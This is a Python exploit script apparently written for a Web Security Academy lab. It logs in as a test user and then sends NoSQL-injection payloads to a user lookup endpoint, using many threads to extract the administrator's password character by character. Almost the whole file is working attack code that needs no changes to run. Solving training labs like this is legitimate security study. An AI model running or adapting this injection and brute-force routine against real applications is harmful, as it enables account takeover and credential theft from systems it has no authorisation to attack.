import requests
import urllib.parse
from string import ascii_lowercase, ascii_uppercase, digits
import threading

HOST = '0ad2006904233c358367145e009e0040.web-security-academy.net'

POST_HEADERS = {
    "Host": HOST,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{HOST}",
    "Connection": "keep-alive",
    "Referer": f"https://{HOST}/login",
    "Cookie": "session=fUd9WfU1IBptbOG6e9XQ6RZfynVi8Sy2",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
}

password = ['#' for x in range(20)]

def get_csrf_token_login():
    r = requests.get(f"https://{HOST}/login", headers=POST_HEADERS)
    POST_HEADERS["Cookie"] = r.headers["Set-Cookie"].split(";")[0]
    return r.text.split('csrf" value="')[1].split('"')[0]

def login(username, password):
    csrf = get_csrf_token_login()
    data = {
        "csrf": csrf,
        "username": username,
        "password": password
    }
    r = requests.post(f"https://{HOST}/login", headers=POST_HEADERS, data=data, allow_redirects=False)

    if r.status_code == 302:
        print(f"Logged in as {username} with password {password}")
        POST_HEADERS["Cookie"] = r.headers["Set-Cookie"].split(";")[0]
        print(f"Session cookie: {POST_HEADERS['Cookie'].split('=')[1]}")
    else:
        print(f"Failed to login as {username} with password {password}")
        print(r.text)
        print(r.headers)
        print(r.status_code)

def sqli_test(sqli):
    sqli = urllib.parse.quote(sqli)

    r = requests.get(f"https://{HOST}/user/lookup?user={sqli}", headers=POST_HEADERS, allow_redirects=False)

    print(r.text)

def brute_force_one_character(i):
    global password
    for c in ascii_lowercase + digits:
            payload = f"administrator' && this.password[{i}] == '{c}' && '1'=='1"
            payload = urllib.parse.quote(payload)
            r = requests.get(f"https://{HOST}/user/lookup?user={payload}", headers=POST_HEADERS, allow_redirects=False)

            if 'Could not find user' not in r.text:
                print(r.text)
                password[i] = c
                print(f"Found character {c} at position {i}; password is now {password}")
                return

def brute_force_password_blind_sqli():
    threads = []
    for i in range(20):
        t = threading.Thread(target=brute_force_one_character, args=(i,))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    print(f"Password is {''.join(password)}")

if __name__ == "__main__":
    login('wiener', 'peter')
    # sqli_test("wiener' && '1'=='1") # Successful user info retrieval
    # sqli_test("administrator' && this.password[0] == 'a' && '1'=='1")
    brute_force_password_blind_sqli()